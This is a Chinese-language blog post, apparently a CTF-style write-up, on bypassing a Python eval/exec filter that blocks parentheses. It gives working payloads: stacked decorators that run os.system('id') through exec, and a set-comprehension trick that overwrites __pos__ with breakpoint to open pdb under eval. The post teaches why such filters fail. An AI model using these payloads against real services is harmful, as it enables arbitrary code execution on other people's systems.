---
title: "不需要括號的 Python"
date: 2025-09-19T18:38:43+08:00
draft: false
ShowToc: true
---


## 前言

看到 huli 大大發的「[不需要括號跟分號的 XSS](https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/)」有感而發，於是我試著寫一個 Python 版本。

不過 Python 可沒有 tagged templates 語法糖給你用，所以我們要想其他方式呼叫函式。



考慮以下程式碼：

```python
def safe_eval(expr):
  if '(' in expr or ')' in expr:
    raise TypeError("safe_eval does not allow ().")
  return eval(expr)

print(safe_eval(input()))
```

你會想要怎麼去搞爆他，例如我們要去讀取機密檔案，或者是執行任意指令。

eval 可能太難了，我們先從 “safe_exec“ 開始，也就是：

```python
def safe_exec(expr):
  if '(' in expr or ')' in expr:
    raise TypeError("safe_eval does not allow ().")
  return exec(expr)

safe_exec(input())
```

## safe_exec（先從 statement 開始）

`exec` 可以執行整段程式碼（statements），所以比較容易透過裝飾器等語法達成。

在 Python 裡面支援裝飾器（decorator），讓你能夠在不修改原函式的情況下，在其之上添加新功能，例如：

```python
def my_decorator(func):
    def wrapper():
        print(">> start func")
        func()
        print(">> end func")
    return wrapper

@my_decorator
def foo():
    print("meowmeow!")

foo()
"""
>> start func
meowmeow!
>> end func
"""
```

我們在最前面定義了一個叫 `my_decorator` 的函式，他的參數預期傳入一個函式 `func`，並在裡面定義了一個子函式 `wrapper` 在呼叫 `func` 前後印一些東西，最後把這個子函式當作回傳值。

裝飾器本質上是一個「接受 function 並回傳新 object（通常也是 function）」的 callable。裝飾器語法可以套在 `class` 上：

```python
@my_decorator
class Z:
    def __init__(self):
        print('init Z')

z = Z()
"""
>> start func
init Z
>> end func
"""
```



在寫出上述的語法後，Python 直譯器就幫你執行完裝飾器函式，且替換回原本的函式了，由於整個行為裡面不需要任何括號，且他會幫你把結果放回來，所以我們可以利用這兩點做到疊裝飾器來寫程式。

```python
@print
class Z:
    pass

"""
<class '__main__.Z'>
"""
```

裝飾器函式在這裡是 `print`，他將類別 `__main__.Z`作為傳入值，最終的結果就是印出這個類別。

裝飾器可以不只放一個，所以我們可以做到以下操作：

```python
@exec
@input
class Z:
    pass

"""
<class '__main__.Z'>__import__('os').system('id')
uid=0(root) gid=0(root) groups=0(root)
"""
```

裝飾器的執行順序是從最靠近函式的開始，然後往上。先執行 input 拿到使用者輸入 `__import__('os').system('id')` 惡意字串（），之後放回原類別，所以現在 Z 就是惡意字串。下一個裝飾器 `exec` 就會拿惡意字串進 `exec` 執行了，可以看到整段都沒有任何的括號。

前面會有 `<class '__main__.Z'>` 是因為 input 的傳入值是 class Z，就跟 `input('>>')`會印出 `>>` 是一樣的。



如果因為各種因素沒辦法用 input，但你想要拿到任意字串的話，可以這樣：

```python
@exec
@"__import__\x28'os'\x29.system\x28'id'\x29".format
class Z:
    pass

"""
uid=0(root) gid=0(root) groups=0(root)
"""
```

核心概念就是要找回傳值是可控字串的 callable。因為是字串，所以可以用 hex 表示來繞括號。



所以最終 Payload：

```python
def safe_exec(expr):
  if '(' in expr or ')' in expr:
    raise TypeError("safe_eval does not allow ().")
  return exec(expr)


payload = "@exec\r@\"__import__\\x28'os'\\x29.system\\x28'id'\\x29\".format\rclass Z:pass"
safe_exec(payload)
"""
uid=0(root) gid=0(root) groups=0(root)
"""
```



不過這種裝飾器的繞法只能用在 exec，eval 的話是吃 expression，就不支援裝飾器語法了，所以就要想辦法繞！

## safe_eval（expression）有沒有辦法執行任意指令？

把題目再貼過來一次

```python
def safe_eval(expr):
  if '(' in expr or ')' in expr:
    raise TypeError("safe_eval does not allow ().")
  return eval(expr)

print(safe_eval(input()))
```

幫大家測試過了，直接拿 safe_exec 的 Payload 貼會有報錯

```bash
Traceback (most recent call last):
  File "/private/tmp/a/test.py", line 6, in <module>
    print(safe_eval(payload))
          ^^^^^^^^^^^^^^^^^^
  File "/private/tmp/a/test.py", line 4, in safe_eval
    return eval(expr)
           ^^^^^^^^^^
  File "<string>", line 1
    @exec
    ^
SyntaxError: invalid syntax
```

那這樣要怎麼繞呢？

直接講重點就是：把 Python 裡面的預設行為蓋掉，然後再觸發就可以成功呼叫。

具體來說，Python 物件裡面有一些 [魔術方法](https://docs.python.org/3/reference/datamodel.html#emulating-numeric-types) 可以來控制運算子行為（加、減、乘、除、取值），例如我可以這樣寫：

```python
class Foo:
    def __init__(self, _num):
        self.num = _num
    def __pos__(self):
        return abs(self.num)

foo = Foo(-123)
print(+foo)
```

定義了一個 Foo 類別，特別定義了 `__pos__` 在他做 `+` 運算的時候，會去取自己的 num 成員變數，絕對值後回傳。

[文件](https://docs.python.org/3/reference/datamodel.html#object.\__pos_\_) 內有寫：

+ Called to implement the unary arithmetic operations (`-`, `+`, [`abs()`](https://docs.python.org/3/library/functions.html#abs "abs") and `~`).

   

就代表要使用該一元操作的時候，會呼叫對應定義的方法。



所以他背後其實是在呼叫指定魔術方法成員函式，所以如果我們嘗試把它蓋成自己想執行的函式：

```python
class Bar:
    pass
bar = Bar()

bar.__class__.__pos__ = breakpoint
+bar

"""
--Return--
> /private/tmp/a/ob2.py(6)<module>()->None
-> +bar
(Pdb)
"""
```

就可以成功開啟 pdb 執行任意 Python code，你說在 `Bar()` 不是有用到括號嗎？ 那邊只要替換成任何預設存在 Python 的物件即可，例如：

```python
help.__class__.__pos__ = breakpoint
+help

"""
--Return--
> /private/tmp/a/ob3.py(2)<module>()->None
-> +help
(Pdb)
"""
```

這樣就真正做到沒有括號了，不過離要能在 eval 使用還有一段距離，[文件](https://docs.python.org/3/library/functions.html#eval) 上面說 eval 是吃 Python expression，所以我們不能直接用 `class Bar: pass` 創建物件，不過這好解決，直接拿預設存在的物件即可，不需要自己創一個。

另外一個問題是 Python expression 內不支援直接賦值，像是 `a = 123` 這種是不能在 eval 內成功運作的，那這樣要如何賦值呢？

在 Python 3.8 新增了一個語法叫 海象表達式（Walrus Operator），他允許你直接在表達式裡面進行同時進行變數賦值和回傳該值，大概像這樣：

```python
payload = "{a:=1234, print(a)}"
eval(payload)

"""
1234
"""
```



不過可惜的是，我們要做到的是像 `help.__class__.__pos__ = breakpoint` 這種 Left hand side 複雜的賦值，這樣海象表達式不支援，會報錯給你看。

我們現在的問題是：如何在 expression 中蓋掉一層以上的成員

接下來這招大家寫 Python 一定用過，那就是： list comprehension，不過我們這邊不能用括號，所以改成大括號，差別只在最後會裝成 set，這邊稱作 set comprehension。

```python
a = {x for x in range(5)}
print(a)
"""
{0, 1, 2, 3, 4}
"""
```



你可能會想 set comprehension 跟這裡要做的複雜賦值有什麼關係，但仔細想想 for loop 本來就是將 `in` 右邊的東西丟給左邊的操作，並且 for loop 是支援複雜成員指定的，所以可以：

```python
{+help for help.__class__.__pos__ in {breakpoint}}
```

這樣就把 help class 的 `__pos__` 蓋成 breakpoint 了，最後 `+help` 就可以成功執行叫出 pdb。



所以最終 Payload：

```python
def safe_eval(expr):
  if '(' in expr or ')' in expr:
    raise TypeError("safe_eval does not allow ().")
  return eval(expr)

payload = "{{+help for help.__class__.__pos__ in {breakpoint}}}"

print(safe_eval(payload))
```



## 結尾

這種不用括號就能呼叫 Python callable 的技巧在 CTF 其實已經行之有年了，我也是在 CTF Discord 中看到 [maple3142](https://blog.maple3142.net/) 大大的對話學到上面提到的技巧。

今年也有用這個技巧在 AIS3 pre-exam 2025 出了兩題 <https://github.com/Vincent550102/My-CTF-Challenge/tree/main/AIS3-preexam/2025>

最後來想想這種情境會出現在哪，例如有個服務，開發者想讓使用者乖乖地用基礎功能、加減乘除等等，認為沒有括號就不會出事（？
